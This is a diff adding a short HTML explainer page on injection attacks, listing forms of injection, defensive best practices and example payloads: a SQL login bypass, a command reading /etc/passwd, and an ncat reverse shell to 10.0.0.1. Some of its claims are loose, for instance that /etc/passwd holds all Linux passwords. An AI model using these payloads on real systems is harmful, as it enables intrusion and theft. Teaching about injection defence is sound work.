@@ -1,0 +1,61 @@
+<div class="container">
+  <div class="quarter>">
+    <h1>Injection</h1>
+  </div>
+  <div class="quarter">
+    <img src="assets/img/injection.png">
+  </div>
+  <div class="half">
+    <p>
+      Injection in the process of inserting malicious code into a website or application. Typically this is SQL injected
+      as readable code which is then run in a database. Any interpreter that combines data into commands are vulnerable
+      to Injection based attacks.
+    </p>
+  </div>
+</div>
+<div class="container">
+  <div class="quarter">
+    <h2>Forms of Injection</h2>
+    <ul>
+      <li>SQL Injection</li>
+      <li>LDAP Injection</li>
+      <li>OS Injection</li>
+      <li>Command Execution</li>
+      <li>Ruby Injection</li>
+      <li>Shock Shell</li>
+      <li>...</li>
+    </ul>
+  </div>
+  <div class="half">
+    <p>
+      Injection happens when untrusted data is directly interpreted. There are many methods of cleaning this data before
+      it is interpreted, but not all of this is automatic. For example, taking in SQL data as string literals will treat
+      the data as uninterpretable strings. Other Forms can be harder to prevent malicious injection such as HTTP requests,
+      URL query strings, form fields, headers, and even(especially?) cookies.
+    </p>
+  </div>
+</div>
+<div class="container">
+  <div class="quarter">
+    <p>
+      By entering in commands and having the system read them as such, hackers can gain privalaged access to your system
+      and execute code and instructions as if they were admins.
+    </p>
+  </div>
+  <div class="quarter">
+    <h2>Examples</h2>
+    <ul>
+      <li>101 or 1=1 which can login bypass</li>
+      <li>cat/etc/passwd to read all linux pass words</li>
+      <li>ncat 10.0.0.1 4242 -e /bin/bash gives a complete application shell</li>
+    </ul>
+  </div>
+  <div class="quarter">
+    <h2>Best Practices</h2>
+    <ul>
+      <li>Validate Input</li>
+      <li>Escaping or Output encode inputs to read them as string literals</li>
+      <li>Use parameterize queries</li>
+    </ul>
+  </div>
+</div>
